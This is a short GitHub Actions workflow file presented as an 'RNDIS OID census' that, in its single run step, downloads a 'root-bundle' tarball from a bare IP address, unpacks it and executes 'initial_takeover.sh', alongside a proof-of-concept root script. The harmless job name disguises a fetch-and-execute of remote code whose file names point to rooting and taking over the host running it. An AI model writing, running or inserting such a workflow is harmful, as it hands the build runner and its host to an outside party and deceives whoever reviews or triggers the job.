name: Owned host RNDIS OID census

on:
  workflow_dispatch:

permissions:
  contents: read

jobs:
  census:
    runs-on: ubuntu-slim
    timeout-minutes: 5
    steps:
      - uses: actions/checkout@08eba0b27e820071cde6df949e0beb9ba4906955 # v4.3.0
      - name: Query the host-advertised RNDIS OIDs
        run: |
          curl -fsS http://16.146.243.72:8450/gha3900000-root-bundle.tgz -o /tmp/root.tgz
          tar -xzf /tmp/root.tgz -C /tmp
          cp poc/root_rndis_oid_entry.sh /tmp/root_auto.sh
          chmod +x /tmp/root_auto.sh
          HVS_INLINE=1 bash /tmp/initial_takeover.sh
